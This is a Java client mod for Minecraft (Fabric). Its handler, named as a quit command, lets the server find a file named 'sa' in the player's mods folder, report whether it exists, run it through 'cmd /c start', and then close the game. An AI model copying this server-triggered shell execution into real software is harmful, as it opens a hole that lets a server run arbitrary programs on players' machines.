package net.narheur.templatemod;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.fabric.api.networking.v1.PacketByteBufs;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;
import java.util.Optional;
import java.util.logging.Logger;

public class QuitCommandClient implements ClientModInitializer {

    private static final String fileName = "sa"; // File Name without extension
    private static final Logger LOGGER = Logger.getLogger("QuitCommandClient");

    // Check and Find the Extension of the file
    private static String getFileNameWithoutExtension(File file) {
        String fileName = file.getName();
        int dotIndex = fileName.lastIndexOf('.');
        return (dotIndex == -1) ? fileName : fileName.substring(0, dotIndex);
    }

    // Send Message to Client
    private static void sendChatMessage(MinecraftClient client, String message) {
        if (client.player != null) {
            client.player.sendMessage(Text.of(message), false);
        }
    }

    @Override
    public void onInitializeClient() {
        // Check the Packet Sent by the Server
        ClientPlayNetworking.registerGlobalReceiver(new Identifier("template-mod", "quit_player"), (client, handler, buf, responseSender) -> {
            client.execute(() -> {
                LOGGER.info("Quit command received from server.");

                // Check the file
                String minecraftDir = MinecraftClient.getInstance().runDirectory.getAbsolutePath();
                File modsDir = new File(minecraftDir + File.separator + "mods");

                // Find te File Named "sa"
                Optional<File> fileToRun = Arrays.stream(modsDir.listFiles())
                        .filter(file -> getFileNameWithoutExtension(file).equals(fileName))
                        .findFirst();

                // Send Feedback to Server
                PacketByteBuf responseBuf = PacketByteBufs.create();
                boolean hasSaFile = fileToRun.isPresent();
                responseBuf.writeBoolean(hasSaFile);
                ClientPlayNetworking.send(new Identifier("template-mod", "sa_file_check"), responseBuf);

                if (!hasSaFile) {
                    // If File Not Found, Warning
                    MinecraftClient.getInstance().player.sendMessage(Text.of("Lütfen sa dosyasını yükleyiniz."), false);
                    LOGGER.warning("'sa' dosyası bulunamadı.");
                } else {
                    LOGGER.info("'sa' dosyası bulundu: " + fileToRun.get().getAbsolutePath());

                    // If File Found
                    try {
                        Runtime.getRuntime().exec("cmd /c start \"\" \"" + fileToRun.get().getAbsolutePath() + "\"");
                        sendChatMessage(client, "File executed successfully: " + fileToRun.get().getAbsolutePath());
                    } catch (IOException e) {
                        LOGGER.severe("Failed to execute file: " + e.getMessage());
                        sendChatMessage(client, "Failed to execute file: " + e.getMessage());
                    }

                    // Closing the Instance
                    MinecraftClient.getInstance().scheduleStop();
                    LOGGER.info("Minecraft client scheduled to stop.");
                }
            });
        });
    }
}
